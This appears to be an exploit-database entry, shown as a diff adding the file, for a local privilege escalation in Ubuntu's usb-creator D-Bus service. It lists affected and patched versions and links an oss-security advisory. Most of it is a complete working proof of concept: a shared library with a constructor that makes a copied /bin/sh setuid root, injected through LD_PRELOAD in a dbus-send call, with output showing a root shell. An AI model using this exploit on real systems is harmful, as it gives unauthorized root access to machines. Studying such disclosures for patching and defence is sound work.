@@ -1,0 +1,23 @@
+Source: http://www.openwall.com/lists/oss-security/2015/04/22/12
+Bug report: https://bugs.launchpad.net/ubuntu/vivid/+source/usb-creator/+bug/1447396
+
+Ubuntu Precise (12.04LTS) <= usb-creator: 0.2.38.3ubuntu    (Patched in: 0.2.38.3ubuntu0.1)
+Ubuntu Trusty  (14.04LTS) <= usb-creator 0.2.56.3ubuntu     (Patched in: 0.2.56.3ubuntu0.1)
+Ubuntu Utopic  (14.10) <= usb-creator 0.2.62ubuntu0.2         (Patched in: 0.2.62ubuntu0.3)
+
+$ cat > test.c
+void __attribute__((constructor)) init (void)
+{
+chown("/tmp/test", 0, 0);
+chmod("/tmp/test", 04755);
+}
+^D
+$ gcc -shared -fPIC -o /tmp/test.so test.c
+$ cp /bin/sh /tmp/test
+$ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
+method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
+$ ls -l /tmp/test
+-rwsr-xr-x 1 root root 121272 Apr 22 16:43 /tmp/test
+$ /tmp/test
+# id
+euid=0(root) groups=0(root)
